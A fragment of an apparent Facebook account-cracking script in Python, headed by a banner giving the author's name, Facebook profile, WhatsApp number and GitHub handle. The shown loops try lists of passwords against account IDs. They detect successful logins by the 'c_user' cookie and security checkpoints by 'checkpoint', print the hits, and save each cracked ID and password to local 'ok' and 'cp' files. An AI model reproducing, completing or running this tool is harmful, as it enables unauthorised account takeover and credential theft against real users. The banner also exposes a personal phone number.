...
\033[1;37;1m[!]======================================================
\033[1;37;1m[•] Author   : MUHAMMAD MOSHIN X3 IRTAZA
\033[1;37;1m[•] Facebook : www.facebook.com/musa.khan.39545
\033[1;37;1m[•] Whatsapp : 03254985137
\033[1;37;1m[•] GitHub   : IRTAZAHA
\033[1;37;1m[•] HELP      : NEED EMOJI NAME ID FOR FREE 🙂❤️
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[IRTAZA-OK] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[IRTAZA-CP] '+cid+' | '+ps+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write('\r\033[1;32m [IRTAZA] \033[1;97m%s/%s   \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[IRTAZA-OK] '+cid+' | '+ps+'\033[0;97m')
				open('Irtaza-ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;93m[Irtaza-CP] '+cid+' | '+ps+'\033[0;97m')
				open('Irtaza-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
